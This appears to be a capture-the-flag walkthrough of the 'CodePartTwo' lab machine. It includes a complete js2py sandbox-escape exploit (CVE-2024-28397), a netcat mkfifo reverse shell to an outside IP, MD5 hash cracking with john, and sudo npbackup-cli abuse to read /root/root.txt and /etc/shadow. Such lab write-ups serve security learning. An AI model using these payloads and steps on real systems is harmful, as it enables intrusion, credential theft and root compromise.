**Enumeration** 

Start with a `nmap` scan to look for open ports.

```
(kali㉿kali)-[~]
└─$ nmap 10.10.11.82 -sV -sC
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 16:13 EST
Nmap scan report for 10.10.11.82
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
```

It gives back two open ports.

| Port | Protocol | Service Details |
| ---- | -------- | --------------- |
| 8000 | http     | Gunicorn 20.0.4 |
| 22   | ssh      | OpenSSH         |

Add the IP address to the known hosts.
`sudo vi /etc/hosts`

Navigate to http://codepartwo.htb/8000

It should display this site:

![[1.png]]

Download the app and extract the files.
![[2.png]]

---

**Vulnerability analysis** 

Looking in `requirements.txt` notice the app uses `js2py`, version 0.74.
`js2py` is a python package that can evaluate javascript code inside python interpreter.

`flask==3.0.3`
`flask-sqlalchemy==3.1.1`
`js2py==0.7`4

With a quick search it shows this vulerability:

**[CVE-2024-28397-js2py-Sandbox-Escape](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)**

In short this vulerability allows to upload a payload on the java editor to execute system commands, escaping the java sandbox enviroment, ultimately accessing `subprocess.Popen`.

Going back to the site,  register a new account.

![[3.png]]

Now it displays a code editor where its possible to write and compile javascript code.

![[4.png]]

This means  that its possible to upload the payload, and get a reverse shell.

---

**Exploit**

The payload looks like this:

```
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

Edit the third line of the code with this line, that should give back a reverse shell using NetCat.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.2 9001 >/tmp/f`

Now in a terminal set up NetCat in listening mode:

`$ nc -lvnp 9001`

Run the code uploaded on the website and get the shell.

![[5.png]]

Its now logged in as 'app'.

Upgrade the simple shell to a full interactive TTY with this python module:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`cd` to `instance` and notice the `user.db` file :

![[6.png]]

The `.db` extension signifies that a file contains data organized in a database format. 
Some applications, like SQLite use `.db` files as their primary database format, storing everything in a single file.

**Lateral movement**

---


![[7.png]]

Simply by using cat its shows that those are passwords hashes.

![[8.png]]

After saving marco's password in a `.txt` file,  crack the hash using `john`.
In this case it's a MD5 hash.
A MD5 hash is created by taking a string of an any length and encoding it into a 128-bit fingerprint.

```
$ john --show --format=Raw-MD5 marco.txt 
?:sweetangelbabylove

1 password hash cracked, 0 left 
```

After getting the password, its possible to access via `ssh` into marco's home directory.

![[9.png]]

Get the `user.txt` flag.

![[10.png]]

---

**Privilege escalation**

Check if any command can be run as root.

![[11.png]]

Marco can run `npbackup-cli` as root.
`npbackup` is a backup tool.
Its central service automates backup verification and cleanup operations across multiple configured backup repositories.

Look at the `backup.conf` file with `vim`

```
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []

```

Edit the paths in the `npbackup.conf` file.

```
paths:
      - /home/app/app/
      - /root/root.txt
      - /etc/shadow
```

Run the command :

```
$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --backup
```

![[12.png]]

Using  the flag `--dump` its possible to read a file from the snapshot id.
`npbackup-cli` is run as root, so it can back up any file even if the user cannot normally read it.

```
$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --snapshot-id 7892c729 --dump /root/root.txt
6a19f2abb0f8a1554a87516b52215bf7
```

